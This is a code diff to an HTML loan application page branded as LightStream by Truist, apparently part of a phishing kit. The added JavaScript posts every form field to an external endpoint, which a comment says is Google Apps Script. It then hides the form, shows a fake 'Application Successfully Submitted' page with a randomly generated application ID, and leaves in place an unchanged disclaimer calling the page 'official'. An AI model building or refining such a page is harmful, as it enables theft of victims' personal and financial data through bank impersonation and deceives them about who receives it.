@@ -227,6 +227,62 @@
         .footer-links a:hover {
             text-decoration: underline;
         }
+        .success-page {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .success-page.active {
+            display: block;
+        }
+        .success-icon {
+            font-size: 80px;
+            color: #28a745;
+            animation: scaleIn 0.5s ease-out;
+        }
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        .success-title {
+            font-size: 32px;
+            color: #28a745;
+            font-weight: 700;
+            margin: 20px 0 10px 0;
+        }
+        .success-message {
+            font-size: 18px;
+            color: #666;
+            margin: 15px 0;
+            line-height: 1.6;
+        }
+        .success-box {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            border: 2px solid #28a745;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        .success-box p {
+            margin: 8px 0;
+            color: #155724;
+            font-weight: 600;
+        }
+        .loader {
+            display: none;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -409,6 +465,28 @@
 
     </form>
 
+    <!-- Success Page -->
+    <div class="success-page" id="successPage">
+        <div class="success-icon">✓</div>
+        <h1 class="success-title">Application Successfully Submitted!</h1>
+        <p class="success-message">Thank you for choosing LightStream by Truist.</p>
+        
+        <div class="success-box">
+            <p>📧 You will receive a confirmation email shortly</p>
+            <p>⏱️ Our team will review your application within 24 hours</p>
+            <p>📞 We'll contact you at the phone number you provided</p>
+        </div>
+        
+        <p class="success-message" style="color: #28a745; font-weight: 600;">
+            Application ID: <span id="appId"></span>
+        </p>
+        <p style="color: #888; font-size: 14px; margin-top: 30px;">
+            You can close this window now.
+        </p>
+    </div>
+
+    <div class="loader" id="loader"></div>
+
     <div class="disclaimer">
         <p><strong>Disclaimer:</strong> This is an official loan application form. By submitting, you agree to our <a href="#" onclick="alert('Terms: Data will be processed securely and used only for loan application purposes.'); return false;">Terms of Service</a> and <a href="#" onclick="alert('Privacy: Your information is protected with bank-level encryption.'); return false;">Privacy Policy</a>.</p>
         <p style="margin-top: 8px;">© 2025 LightStream by Truist. All rights reserved.</p>
@@ -439,11 +517,41 @@
                 }
             }
             
-            // Add submission timestamp
-            const timestamp = new Date().toISOString();
-            console.log('Form submitted at:', timestamp);
+            // Submit form via AJAX
+            const form = document.querySelector('form');
+            const formData = new FormData(form);
             
-            return true;
+            // Show loader
+            document.getElementById('loader').style.display = 'block';
+            document.querySelector('.form-container').style.opacity = '0.5';
+            
+            // Submit to Google Apps Script
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Hide loader and form
+                document.getElementById('loader').style.display = 'none';
+                document.querySelector('form').style.display = 'none';
+                document.querySelector('.disclaimer').style.display = 'none';
+                document.querySelector('.footer-links').style.display = 'none';
+                
+                // Show success page
+                document.getElementById('successPage').classList.add('active');
+                
+                // Generate random application ID
+                const appId = 'LS' + Date.now().toString().slice(-8);
+                document.getElementById('appId').textContent = appId;
+            })
+            .catch(error => {
+                document.getElementById('loader').style.display = 'none';
+                document.querySelector('.form-container').style.opacity = '1';
+                alert('Submission error. Please try again.');
+            });
+            
+            return false; // Prevent default form submission
         }
 
         function showPage(pageNum) {
